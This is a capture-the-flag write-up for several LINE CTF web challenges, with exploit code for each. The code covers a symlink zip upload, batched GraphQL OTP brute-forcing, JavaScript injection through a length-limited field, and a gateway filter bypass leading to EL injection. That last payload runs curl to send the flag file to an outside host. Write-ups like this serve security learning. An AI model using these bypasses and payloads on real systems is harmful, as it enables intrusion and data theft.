
## zipviewer-version-citizen

To solve the challenge we need to upload a symlink file in zipfile.

When we upload zipfile, it will be unzipped and then, symlink in zipfile will be deleted.
But if the entry name contains `../`, symlink will not be deteled.

Therefore we create a symlink entry `foo/../bar` in zipfile.

```python
import zipfile
import os

zipInfo = zipfile.ZipInfo('foo/../bar')
zipInfo.create_system = 3
zipInfo.external_attr |= 0xA0000000

zip = zipfile.ZipFile('test.zip', 'w')
zip.writestr('foo/ok', 'ok')
zip.writestr(zipInfo, os.readlink('flag'))
zip.close()
```

`LINECTF{af9390451ae12393880d76ea1f6cffc1}`


## zipviewer-version-clown

Solvable with the same solver of zipviewer-version-citizen.

`LINECTF{34d98811f9f20094d1cc75af9299e636}`


## graphql-101

We have to detect the 40 otps to get the flag.
Each otp is in the range 0 to 999 and we can check the otp with GraphQL query.
We must detect each otp in 5 GraphQL requests.
It is impossible to detect all otps in natural.

However, since we can send 250 queries at one request, it is possible to detect the otp within 5 requests.

Also, the server limit the body size to 128b but we can bypass it with GET parameter `?query=`.

```javascript
test = async (i, otpNum) => {
  s = '';
  for (let otp = 250*otpNum; otp < 250*(otpNum+1); ++otp) s += `b${otp}:otp(u:$u,i:${i},otp:"${otp.toString().padStart(3,'0')}") `;
  query = `query test($u:String!){${s}}`;
  body = {"variables":"{\"u\":\"admin\"}"};

  res = await (await fetch(`/graphql?query=${query}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
  })).json()
  data = res.data
  return Object.values(data).includes('OK !!!')
}
for (let i = 0; i < 40; ++i) {
  for (let j = 0; j < 4; ++j) { 
    if (await test(i, j)) { break }
  }
}
```

`LINECTF{db37c207abbc5f2863be4667129f70e0}`

## G0tcha-G0tcha-doggy

Some random numbers are picked in the server.
If the `agent_a_array` is `[5]` and `bonus_number` is `20`, we can retrieve the flag.
However, it is impossible in natural.

Since we could inject the JavaScript code with `dateTime` parameter, those numbers are controllable.

We overwrite `JSON.stringify` function to `''.toString.bind('[5]')` so that the function will return string `[5]`.

Server restricts the length of `dateTime` parameter to 25, so we split the payload.

```javascript
a='[5]'
b=a.toString.bind(a)
JSON.stringify=b
```

This is the final exploit.

```python
import requests
import json

host = '34.85.97.250:11008'
#host = 'localhost:8000'

r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,5,5],
    "dateTime":"(a=%27[5]%27)"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)


r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,5,5],
    "dateTime":"(b=a.toString.bind(a))"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)


r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,20],
    "dateTime":"(JSON.stringify=b)"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)

r = requests.post('http://{}/api/gotcha'.format(host), data=json.dumps({
    "userName":"test",
    "userNumbers":[5,20],
    "dateTime":"0)%2b20};//"
}), headers={"Content-Type": "application/json"})
result = r.json()
print(result)

r = requests.get('http://{}/api/gotcha/{}'.format(host, result['result']['uuid']))
open('flag', 'w').write(r.json()['imageUrl'])
```

`LINECTF{1c817e624ca6e4875e1a876aaf3466fc}`


## Heritage
There are gateway server and background app server.

If we can send the payload to app server's `/api/internal/`, we can get the shell with EL injection.

Gateway server has some filter and it is impossible to send the request to `/api/internal/` in normal way.
However, we can bypass URL filter with URL encode and `..;/`

`POST /api;/external;/..;/intern%61l/ HTTP/1.1`

Also, there are filters for the payload so that the gateway denied `Runtime`, `invoke` and `exec`.
However, we can bypass it with JSON unicode encoding.

This is the final payload.

```
POST /api;/external;/..;/intern%61l/ HTTP/1.1
Host: localhost:20080
Accept: application/json
Content-Type: application/json
Content-Length: 225

{"name":"${''.getClass().forName('java.lang.\u0052untime').getM\u0065thods()[6].invok\u0065(''.getClass().forNam\u0065('java.lang.\u0052untime')).\u0065xec('curl 9dnb2k1swixxc9d9mqiohi8xbohf5ct1.oastify.com -F f=@/FLAG')}"}

```

`LINECTF{7988de328384f8a19998923a87aa053f}`
